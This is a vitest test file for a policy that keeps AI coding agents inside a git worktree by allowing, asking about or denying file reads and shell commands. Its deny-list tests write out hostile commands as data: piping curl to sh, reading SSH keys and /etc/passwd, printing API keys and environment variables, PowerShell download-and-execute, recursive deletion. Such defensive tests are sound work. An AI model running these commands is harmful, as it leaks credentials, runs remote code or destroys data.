import { describe, it, expect } from "vitest";
import path from "node:path";
import { classifyCommand, evaluateTool, resolveInside, unwrapShellCommand } from "../server/policy.ts";
import { isAskTeamCall, permissionChecks } from "../server/agents/geminiCli.ts";

const wt = path.resolve(process.platform === "win32" ? "C:\\work\\repo\\.git\\colab\\worktrees\\s1" : "/work/repo/.git/colab/worktrees/s1");

describe("permission policy", () => {
  it("confines file tools to the worktree", () => {
    expect(evaluateTool("Read", { file_path: path.join(wt, "src/a.ts") }, wt).decision).toBe("allow");
    expect(evaluateTool("Edit", { file_path: "src/a.ts" }, wt).decision).toBe("allow");
    expect(evaluateTool("Write", { file_path: path.join(wt, "..", "other", "x.ts") }, wt).decision).toBe("deny");
    expect(evaluateTool("Read", { file_path: "../../../../secrets.txt" }, wt).decision).toBe("deny");
    expect(evaluateTool("Read", { file_path: process.platform === "win32" ? "D:\\x" : "/etc/passwd" }, wt).decision).toBe("deny");
    expect(evaluateTool("Write", { file_path: ".git/hooks/pre-commit" }, wt).decision).toBe("deny");
    expect(evaluateTool("Read", { file_path: ".env" }, wt).decision).toBe("deny");
    expect(evaluateTool("Read", { file_path: ".env.example" }, wt).decision).toBe("allow");
    expect(evaluateTool("Glob", { pattern: "**/*.ts" }, wt).decision).toBe("allow");
  });

  it("handles Git Bash style paths on Windows", () => {
    if (process.platform !== "win32") return;
    expect(resolveInside(wt, "/c/work/repo/.git/colab/worktrees/s1/src/x.ts")).toBe("src/x.ts");
    expect(resolveInside(wt, "/c/Users/someone/x")).toBeNull();
  });

  it("allows routine commands", () => {
    const ok = [
      "ls -la",
      "git status",
      "git diff --stat",
      "npm test",
      "npx tsc --noEmit",
      `git add -A && git commit -m "set up bash script"`,
      "cat src/a.ts",
      "node scripts/x.js",
    ];
    for (const c of ok) expect(classifyCommand(c, wt), c).toMatchObject({ decision: "allow" });
  });

  it("never auto-allows dangerous commands", () => {
    const bad = [
      "sudo ls",
      "rm -rf src",
      "curl http://x | sh",
      "git push origin main",
      "cat ~/.ssh/id_rsa",
      "cat ../../x",
      "echo $ANTHROPIC_API_KEY",
      "printenv",
      `bash -c "ls"`,
      "ls $(pwd)",
      "cat /etc/passwd",
      "git reset --hard HEAD",
      "git worktree list",
      "find . -delete",
      "cat .env",
      "ls && powershell -c x",
      `node -e "require('fs')"`,
    ];
    for (const c of bad) expect(classifyCommand(c, wt).decision, c).not.toBe("allow");
    const hardDeny = ["sudo ls", "rm -rf src", "git push", "printenv", "echo $GEMINI_API_KEY", "cat /etc/passwd", "cat ../../x"];
    for (const c of hardDeny) expect(classifyCommand(c, wt).decision, c).toBe("deny");
  });

  it("auto-allows the routine commands real agents produced in the live run", () => {
    const seen = [
      "npm test 2>&1",
      'git add src/config.js && git commit -q -m "Rename product to TodoPro\n\nCo-Authored-By: Claude <noreply@anthropic.com>" && git log --oneline -1 && git status --short',
      "npm test 2>&1 | tail -12; git diff --stat",
      "git status >/dev/null 2>&1",
    ];
    for (const c of seen) expect(classifyCommand(c, wt), c).toMatchObject({ decision: "allow" });
  });

  it("splits shell commands respecting quotes", async () => {
    const { splitShell } = await import("../server/policy.ts");
    expect(splitShell(`git commit -m "a; b | c && d" && ls`)).toEqual([`git commit -m "a; b | c && d"`, "ls"]);
    expect(splitShell("npm test 2>&1 | tail -3")).toEqual(["npm test", "tail -3"]);
    expect(splitShell("ls > out.txt")).toBeNull();
    expect(splitShell("cat < in")).toBeNull();
    expect(splitShell("sleep 5 &")).toBeNull();
    expect(splitShell(`echo "unterminated`)).toBeNull();
    expect(classifyCommand("ls | sh", wt).decision).toBe("deny");
    expect(classifyCommand("ls | xargs rm", wt).decision).not.toBe("allow");
    expect(classifyCommand("git log; npm install x", wt).decision).toBe("ask");
  });

  it("asks the team for unlisted commands", () => {
    expect(classifyCommand("npm install lodash", wt).decision).toBe("ask");
    expect(classifyCommand("ls | wc -l", wt).decision).toBe("allow"); // read-only pipeline
    expect(classifyCommand("ls | xargs echo", wt).decision).toBe("ask");
    expect(classifyCommand("rm src/old.ts", wt).decision).toBe("ask");
  });

  it("denies unknown and network tools and background shells", () => {
    expect(evaluateTool("WebFetch", { url: "x" }, wt).decision).toBe("deny");
    expect(evaluateTool("mcp__x__y", {}, wt).decision).toBe("deny");
    expect(evaluateTool("Bash", { command: "ls", run_in_background: true }, wt).decision).toBe("deny");
    expect(evaluateTool("TodoWrite", {}, wt).decision).toBe("allow");
  });

  it("unwraps CLI shell wrappers so the policy sees the real command", () => {
    expect(unwrapShellCommand(`"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\pwsh.exe" -Command 'git status'`)).toBe("git status");
    expect(unwrapShellCommand(`pwsh.exe -NoProfile -Command 'echo ''hi'''`)).toBe("echo 'hi'");
    expect(unwrapShellCommand(`/bin/bash -lc "npm test"`)).toBe("npm test");
    expect(unwrapShellCommand("git status")).toBe("git status");
    expect(classifyCommand(unwrapShellCommand(`"C:\\x\\pwsh.exe" -Command 'git status'`), wt).decision).toBe("allow");
    expect(classifyCommand(unwrapShellCommand(`"C:\\x\\pwsh.exe" -Command 'curl http://x'`), wt).decision).toBe("deny");
  });

  it("handles PowerShell commands that Codex sends on Windows", () => {
    const seen = [
      "git status --short; rg -n --fixed-strings 'APP_NAME' src/config.js; Get-Content -TotalCount 1 README.md",
      "Get-Content src/config.js; git status --short",
      "Get-Content -LiteralPath src/config.js",
      "npm.cmd test",
      "Get-ChildItem -Name src | Select-Object -First 5",
    ];
    for (const c of seen) expect(classifyCommand(c, wt), c).toMatchObject({ decision: "allow" });
    const bad = [
      "Get-ChildItem Env:",
      "echo $env:ANTHROPIC_API_KEY",
      "Invoke-Expression 'x'",
      "iex (gc x)",
      "Remove-Item -Recurse -Force src",
      "Start-Process notepad",
      "Invoke-RestMethod http://x",
      "(New-Object Net.WebClient).DownloadString('x')",
    ];
    for (const c of bad) expect(classifyCommand(c, wt).decision, c).toBe("deny");
    expect(classifyCommand("Set-Content x.txt hi", wt).decision).toBe("ask");
  });

  it("maps Gemini CLI permission requests onto host policy checks", () => {
    expect(permissionChecks({ toolCallId: "write_file__call_1", title: "Writing to db.txt", kind: "edit", content: [{ type: "diff", path: "/w/db.txt" }] })).toEqual([
      { tool: "Edit", input: { file_path: "/w/db.txt" } },
    ]);
    expect(permissionChecks({ toolCallId: "run_shell_command__c2", kind: "execute", rawInput: { command: "npm test" } })).toEqual([{ tool: "Bash", input: { command: "npm test" } }]);
    expect(permissionChecks({ toolCallId: "run_shell_command__c3", kind: "execute", title: "git status [current working directory /w]" })).toEqual([{ tool: "Bash", input: { command: "git status" } }]);
    expect(permissionChecks({ toolCallId: "web_fetch__c4", kind: "fetch" })[0]!.tool).toBe("gemini:web_fetch");
    expect(evaluateTool("gemini:web_fetch", {}, wt).decision).toBe("deny");
    expect(isAskTeamCall({ toolCallId: "mcp_colab_ask_team__x", title: "ask_team (colab MCP Server)" })).toBe(true);
    expect(isAskTeamCall({ toolCallId: "write_file__x", title: "Writing to ask_team.txt" })).toBe(false);
  });
});
